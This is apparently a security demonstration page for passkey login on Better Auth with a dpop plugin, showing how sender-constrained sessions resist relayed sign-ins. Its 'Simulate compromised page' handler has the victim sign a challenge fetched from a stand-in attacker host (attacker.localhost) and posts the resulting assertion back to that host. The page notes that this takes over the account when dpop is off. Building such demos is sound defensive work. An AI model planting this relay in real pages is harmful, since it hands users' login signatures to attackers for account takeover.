<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Acme Workspace (Better Auth + dpop)</title>
<style>
  :root { --bg:#f6f7f9; --card:#fff; --ink:#0d1117; --muted:#667085; --line:#e4e7ec; --brand:#0a7c42; }
  * { box-sizing: border-box; }
  body { margin:0; background:var(--bg); color:var(--ink); font:15px/1.55 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; display:grid; place-items:center; min-height:100vh; }
  .card { width:min(410px,92vw); background:var(--card); border:1px solid var(--line); border-radius:16px; padding:34px 30px; box-shadow:0 10px 30px rgba(16,24,40,.06); }
  .brand { display:flex; align-items:center; gap:10px; font-weight:700; font-size:18px; margin-bottom:14px; }
  .logo { width:30px; height:30px; border-radius:8px; background:linear-gradient(135deg,var(--brand),#12b886); }
  .mode { font-size:12px; font-weight:600; border-radius:999px; padding:4px 10px; display:inline-block; margin-bottom:18px; }
  .mode.off { background:#fff4f2; color:#b42318; border:1px solid #f1c7c2; }
  .mode.on  { background:#eafaf1; color:#0a7c42; border:1px solid #bde8cf; }
  h1 { font-size:20px; margin:0 0 4px; }
  p.sub { margin:0 0 24px; color:var(--muted); }
  button { width:100%; padding:13px; border:0; border-radius:10px; background:var(--brand); color:#fff; font:inherit; font-weight:600; cursor:pointer; }
  button:disabled { opacity:.55; cursor:default; }
  .status { margin-top:16px; min-height:22px; color:var(--muted); font-size:14px; }
  .ok { color:#0a7c42; font-weight:600; }
  .home { display:none; text-align:center; padding:12px 0; }
  .home .big { font-size:24px; font-weight:700; margin:6px 0; }
  .avatar { width:64px; height:64px; border-radius:50%; background:linear-gradient(135deg,var(--brand),#12b886); display:grid; place-items:center; color:#fff; font-weight:700; font-size:26px; margin:0 auto 10px; }
  .pill { font-family:ui-monospace,Menlo,Consolas,monospace; font-size:11px; color:var(--muted); word-break:break-all; margin-top:8px; }
  details { margin-top:22px; border-top:1px solid var(--line); padding-top:14px; }
  details summary { cursor:pointer; color:var(--muted); font-size:13px; list-style:none; }
  details summary::-webkit-details-marker { display:none; }
  details input { width:100%; padding:9px; border:1px solid var(--line); border-radius:8px; font:inherit; margin:8px 0 0; }
  details button { background:#fff; color:var(--ink); border:1px solid var(--line); margin-top:12px; }
  .evil { background:#fff; color:#b42318; border:1px solid #f1c7c2; margin-top:10px; }
  .foot { margin-top:22px; color:#98a2b3; font-size:12px; text-align:center; }
</style>
</head>
<body>
<div class="card">
  <div class="brand"><div class="logo"></div> Acme Workspace <span style="font-weight:500;color:var(--muted);font-size:13px">· Better Auth</span></div>
  <div id="mode" class="mode on">checking mode…</div>

  <div id="login">
    <h1>Sign in</h1>
    <p class="sub">Passkey login on Better Auth, with the <b>dpop</b> plugin adding a per-session key.</p>
    <button id="go">Sign in with passkey</button>
    <button id="evil" class="evil" title="Models an XSS'd page relaying your signature to the attacker">Simulate compromised page (relay my sign-in)</button>
    <div id="status" class="status"></div>

    <details id="setup">
      <summary>First time here? Create an account</summary>
      <input id="username" placeholder="Username" autocomplete="off" />
      <button id="enroll">Create account and add passkey</button>
      <div id="setupStatus" class="status"></div>
    </details>
  </div>

  <div id="home" class="home">
    <div class="avatar" id="hinit">?</div>
    <div>Signed in <span class="ok">&#10003;</span> <span id="htag"></span></div>
    <div class="big" id="hname">Welcome</div>
    <div class="pill" id="hjkt"></div>
  </div>

  <div class="foot">Better Auth session &middot; sender-constrained by the authenticator-held key</div>
</div>

<script type="module">
import { PasskeyProvider } from '/passkey-provider.js';
const q = new URLSearchParams(location.search);
const provider = new PasskeyProvider({ authOrigin: q.get('auth') || 'http://authenticator.localhost:5415' });
const $ = (id) => document.getElementById(id);
const DROP = q.get('drop') || 'http://attacker.localhost:5413';
const API = '/api/auth/dpop';
const post = (u, body) => fetch(u, { method:'POST', credentials:'include', headers:{'content-type':'application/json'}, body: JSON.stringify(body||{}) });

let enforce = true;
(async () => {
  try { enforce = (await (await fetch(API + '/mode', { credentials:'include' })).json()).enforce; } catch {}
  const m = $('mode');
  m.className = 'mode ' + (enforce ? 'on' : 'off');
  m.textContent = enforce ? 'dpop ON — session sender-constrained (fix)' : 'dpop OFF — plain bearer session (vulnerable)';
})();

$('enroll').onclick = async () => {
  const username = $('username').value.trim();
  if (!username) { $('setupStatus').textContent = 'Enter a username.'; return; }
  $('enroll').disabled = true; $('setupStatus').textContent = 'Creating account…';
  try {
    const begin = await (await post(API + '/register/begin', { username })).json();
    const reg = await provider.register(username);
    const fin = await (await post(API + '/register/finish', { userId: begin.publicKey.user.id, credId: reg.credId, publicKey: reg.publicKey, passkeyToken: begin.passkeyToken })).json();
    if (!fin.ok) throw new Error(fin.error || 'register failed');
    $('setupStatus').innerHTML = 'Passkey added <span class="ok">&#10003;</span> Now click <b>Sign in with passkey</b>.';
  } catch (e) { $('setupStatus').textContent = 'Setup failed: ' + (e.message || e); $('enroll').disabled = false; }
};

$('go').onclick = async () => {
  $('go').disabled = true; $('status').textContent = 'Signing in…';
  try {
    const begin = await (await post(API + '/login/begin', {})).json();
    const { assertion, handle } = await provider.login(begin.publicKey.challenge);
    const fin = await (await post(API + '/login/finish', { assertion, passkeyToken: begin.passkeyToken })).json();
    if (!fin.ok) throw new Error(fin.error || 'login failed');
    // Use the session. /dpop/me needs a proof signed by the authenticator-held session key.
    const htu = location.origin + '/api/auth/dpop/me';
    const { nonce } = await (await post(API + '/pop-challenge', {})).json();
    const proof = await provider.prove(handle, 'GET', htu, nonce);
    const hdr = btoa(unescape(encodeURIComponent(JSON.stringify(proof)))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
    const me = await (await fetch(htu, { credentials:'include', headers: { 'x-dpop-proof': hdr } })).json();
    $('hinit').textContent = (String(me.username||'?').trim()[0] || '?').toUpperCase();
    $('hname').textContent = 'Welcome, ' + (me.username || 'you');
    $('htag').textContent = enforce ? '(dpop-bound)' : '(bearer)';
    $('hjkt').textContent = me.jkt ? 'bound jkt (SK): ' + me.jkt : 'no binding (vulnerable mode)';
    $('login').style.display = 'none'; $('home').style.display = 'block';
  } catch (e) { $('status').textContent = 'Sign-in failed: ' + (e.message || e); $('go').disabled = false; }
};

// Compromised page: sign the attacker's challenge and drop the assertion. No page-held key to leak,
// and the assertion names the VICTIM's authenticator-held SK, so the attacker can't substitute or prove.
$('evil').onclick = async () => {
  $('evil').disabled = true; $('status').textContent = 'Relaying sign-in to attacker…';
  try {
    const off = await (await fetch(DROP + '/x/offer')).json();
    if (!off.publicKey || !off.publicKey.challenge) { $('status').textContent = 'No attacker offer waiting. Open the attacker tab first.'; $('evil').disabled = false; return; }
    const { assertion } = await provider.login(off.publicKey.challenge);
    await fetch(DROP + '/x/assertion', { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({ assertion }) });
    $('status').innerHTML = enforce
      ? 'Signature relayed. Watch the attacker tab: the login completes but the session is <b>inert</b>.'
      : 'Signature relayed. Watch the attacker tab: it <b>takes over</b> your account (dpop is off).';
    $('evil').disabled = false;
  } catch (e) { $('status').textContent = 'Relay failed: ' + (e.message || e); $('evil').disabled = false; }
};
</script>
</body>
</html>
